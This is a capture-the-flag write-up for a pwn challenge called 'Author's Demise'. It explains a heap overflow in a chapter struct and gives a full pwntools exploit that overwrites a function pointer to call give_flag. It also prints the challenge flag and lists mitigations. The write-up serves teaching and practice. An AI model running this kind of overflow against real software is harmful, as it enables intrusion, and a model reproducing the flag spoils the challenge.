# CTF Writeup: Author's Demise

**Challenge Name:** Author's Demise  
**Category:** Binary Exploitation / Pwn  
**Difficulty:** Medium  
**Flag:** `LNMHACKS{h34p_func710n_p01n73r_h1j4ck}`

## Challenge Overview

This challenge provides a vulnerable binary executable called "Author's Demise". Players are given only the compiled binary (`vuln`) and must reverse engineer it to discover and exploit a heap overflow vulnerability to hijack a function pointer and gain code execution to retrieve the flag.

## Initial Analysis

### Binary Reconnaissance

First, we need to gather information about the binary:

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64

$ checksec vuln
[*] '/path/to/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

Key observations:
- 64-bit Linux binary
- NX enabled (stack is not executable)
- No PIE (Position Independent Executable), so addresses are static
- No stack canaries

### Dynamic Analysis

Running the binary reveals it's a book publishing application:

```
$ ./vuln
Please enter the title of the book you would like to write: Test

1. Edit chapter
2. Delete chapter
3. Publish book
Choice:
```

The program allows users to:
1. Create chapters with names and content
2. Delete chapters (option not fully implemented)
3. Publish the book

### Source Code Review (For Reference)

Through reverse engineering with tools like Ghidra or IDA Pro, we can reconstruct the program's logic. The vulnerable program implements a simple book creation system with the following key structures:

```c
typedef struct {
    char name[16];
    char content[16];
    void (*print_func)(void *);
} chapter;

typedef struct {
    char *title;
    int num_chapters;
    chapter **chapters;
} book;
```

Each chapter contains:
- A 16-byte name buffer
- A 16-byte content buffer
- A function pointer `print_func` that gets called during publishing

### Key Observations

1. **Unsafe Input Function**: The code uses a custom `gets()` implementation that calls `fgets()` with a large buffer size (0x1000), allowing buffer overflow.

2. **Heap Layout**: Chapters are allocated on the heap with `malloc(sizeof(chapter))`, placing the function pointer immediately after the two 16-byte buffers.

3. **Target Function**: There's a `give_flag()` function that reads and prints the flag, but it requires `success == 0x1337` (note: there's a typo in the source with `0x133&`).

4. **Memory Layout**:
   ```
   [name: 16 bytes][content: 16 bytes][print_func: 8 bytes]
   ```

## Vulnerability Analysis

### The Bug

The vulnerability lies in the `create_chapter()` function:

```c
printf("Enter chapter %d content: ", num);
gets(ch->content);  // Overflow here!
```

The `gets()` function doesn't restrict input length, allowing us to write beyond the 16-byte `content` buffer. Since the `print_func` pointer is stored immediately after `content` in the struct, we can overwrite it.

### Exploitation Strategy

1. **Create a chapter** with normal name input
2. **Overflow the content buffer** to overwrite the `print_func` pointer with the address of `give_flag`
3. **Publish the book** which calls `ch->print_func(ch)`, executing our hijacked function
4. **Get the flag** when `give_flag()` executes

## Developing the Exploit

### Step 1: Finding the Target Address

Using pwntools, we can extract the address of `give_flag()` from the binary's symbol table:

```python
from pwn import *

elf = ELF('./vuln')
give_flag = elf.symbols['give_flag']
log.info(f"give_flag @ {hex(give_flag)}")
```

This retrieves the function address from the binary's symbol table. Since PIE is disabled, this address is static.

### Step 2: Crafting the Payload

The payload structure:

```python
payload  = b"A" * 16          # Fill the content buffer (16 bytes)
payload += p64(give_flag)     # Overwrite print_func pointer (8 bytes)
```

This creates a 24-byte payload:
- First 16 bytes fill the `content` buffer
- Next 8 bytes overwrite the `print_func` pointer with `give_flag` address

### Step 3: Complete Exploit Script

Here's the complete exploit that solves the challenge:

```python
from pwn import *

# Setup
context.binary = './vuln'
context.log_level = 'debug'

elf = ELF('./vuln')
p = process('./vuln')

# Resolve give_flag
give_flag = elf.symbols['give_flag']
log.info(f"give_flag @ {hex(give_flag)}")

# 1. Enter book title
p.sendlineafter(
    b"Please enter the title of the book you would like to write: ",
    b"CTF_BOOK"
)

# 2. Choose "Edit chapter"
p.sendlineafter(b"Choice: ", b"1")

# 3. Create chapter 1
p.sendlineafter(b"Enter chapter number: ", b"1")

# 4. Safe chapter name input
p.sendlineafter(b"Enter chapter 1 name: ", b"chapter1")

# 5. Overflow chapter content → overwrite print_func
payload  = b"A" * 16          # fill content buffer
payload += p64(give_flag)     # overwrite function pointer

p.sendlineafter(b"Enter chapter 1 content: ", payload)

# 6. Publish book → triggers give_flag()
p.sendlineafter(b"Choice: ", b"3")

# Get flag
p.interactive()
```

### Memory State After Overflow

Before overflow:
```
[name: "chapter1\x00..."][content: empty...][print_func: &print_chapter]
```

After overflow:
```
[name: "chapter1\x00..."][content: "AAAAAAAAAAAAAAAA"][print_func: &give_flag]
```

### Execution Flow

When we select option 3 (Publish book), the code calls:

```c
void publish_book(book *b) {
    for (int i = 0; i < b->num_chapters; i++) {
        chapter *ch = b->chapters[i];
        ch->print_func(ch);  // Calls give_flag instead of print_chapter!
    }
}
```

Since we've overwritten `print_func` with the address of `give_flag`, this executes our target function.

## Flag Capture

Running the exploit:

```bash
$ python exploit.py
[*] give_flag @ 0x401234
[+] Starting local process './vuln'
...
Congratulations! Here's your flag:
LNMHACKS{h34p_func710n_p01n73r_h1j4ck}
```

## Key Takeaways

1. **Heap Buffer Overflows**: Even with heap allocations, adjacent memory can be corrupted if proper bounds checking isn't implemented.

2. **Function Pointer Hijacking**: Overwriting function pointers is a classic exploitation technique that allows attackers to redirect code execution.

3. **Struct Layout Matters**: Understanding how structs are laid out in memory is crucial for exploitation. In C, struct members are stored sequentially.

4. **Input Validation**: The use of unsafe functions like `gets()` (even with "safe" wrappers) can lead to severe vulnerabilities.

## Mitigation Strategies

To prevent this type of vulnerability:

1. **Use Safe Input Functions**: Replace `gets()` with length-checked functions like `fgets()` with proper size limits
2. **Implement Bounds Checking**: Always validate input lengths before copying to buffers
3. **Enable Stack Canaries**: While this is a heap vulnerability, canaries can help detect corruption
4. **ASLR & PIE**: Address Space Layout Randomization makes function addresses unpredictable
5. **Control Flow Integrity**: Modern defenses like CFI can prevent arbitrary function pointer overwrites
6. **Separate Code and Data**: Use DEP/NX to prevent code execution from data regions

## Conclusion

This challenge demonstrates a classic heap-based function pointer hijacking attack. By carefully crafting our input to overflow a heap buffer and overwrite an adjacent function pointer, we successfully redirected program execution to the `give_flag()` function and captured the flag.

The flag `LNMHACKS{h34p_func710n_p01n73r_h1j4ck}` perfectly describes the exploitation technique used!